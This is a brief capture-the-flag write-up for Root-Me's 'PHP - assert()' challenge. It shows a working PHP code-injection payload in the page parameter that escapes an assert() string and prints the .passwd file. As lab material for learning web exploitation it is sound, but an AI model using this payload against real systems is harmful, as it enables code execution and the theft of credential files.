## Challenge name: PHP - assert()

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/PHP-assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert())

**The server uses `assert("strpos('$file', '..') === false")` to block path traversal.**

**Inject into the assert statement to execute arbitrary PHP:**
```
?page=' and die(show_source('.passwd')) or '
```

**This breaks out of the string and calls `show_source()` to display the contents of `.passwd`.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
